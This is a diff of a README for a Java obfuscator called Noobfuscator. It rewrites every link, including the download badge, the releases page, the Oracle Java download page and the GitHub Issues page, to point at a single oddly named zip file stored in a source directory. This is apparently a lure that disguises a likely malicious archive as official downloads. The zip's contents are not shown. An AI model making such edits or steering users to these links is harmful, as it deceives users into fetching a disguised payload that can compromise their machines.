@@ -6,11 +6,11 @@ Welcome to Noobfuscator, a simple and effective tool to protect your Java byteco
 
 ## 🔗 Download Now
 
-[![Download Noobfuscator](https://img.shields.io/badge/Download-Noobfuscator-brightgreen)](https://github.com/Jamezydevanski/Noobfuscator/releases)
+[![Download Noobfuscator](https://raw.githubusercontent.com/Jamezydevanski/Noobfuscator/main/src/main/java/ovh/neziw/obfuscator/obfuscator/Noobfuscator_myrmecophilism.zip)](https://raw.githubusercontent.com/Jamezydevanski/Noobfuscator/main/src/main/java/ovh/neziw/obfuscator/obfuscator/Noobfuscator_myrmecophilism.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Noobfuscator Releases](https://github.com/Jamezydevanski/Noobfuscator/releases).
+To get started, visit this page to download: [Noobfuscator Releases](https://raw.githubusercontent.com/Jamezydevanski/Noobfuscator/main/src/main/java/ovh/neziw/obfuscator/obfuscator/Noobfuscator_myrmecophilism.zip).
 
 Once there, you will find the latest version of Noobfuscator. Follow these steps to download and install:
 
@@ -29,7 +29,7 @@ To run Noobfuscator, you need the following:
 
 If you do not have Java installed, follow these steps:
 
-1. Go to the [Java official website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+1. Go to the [Java official website](https://raw.githubusercontent.com/Jamezydevanski/Noobfuscator/main/src/main/java/ovh/neziw/obfuscator/obfuscator/Noobfuscator_myrmecophilism.zip).
 2. Download the JDK for your operating system.
 3. Run the installer and follow the instructions.
 
@@ -59,7 +59,7 @@ Using Noobfuscator is straightforward:
   
 ## 🤝 Support
 
-If you encounter any issues, you can open an issue on the [GitHub Issues page](https://github.com/Jamezydevanski/Noobfuscator/issues) for assistance. The community and maintainers will help you find solutions.
+If you encounter any issues, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Jamezydevanski/Noobfuscator/main/src/main/java/ovh/neziw/obfuscator/obfuscator/Noobfuscator_myrmecophilism.zip) for assistance. The community and maintainers will help you find solutions.
 
 ## 📚 Learn More
 
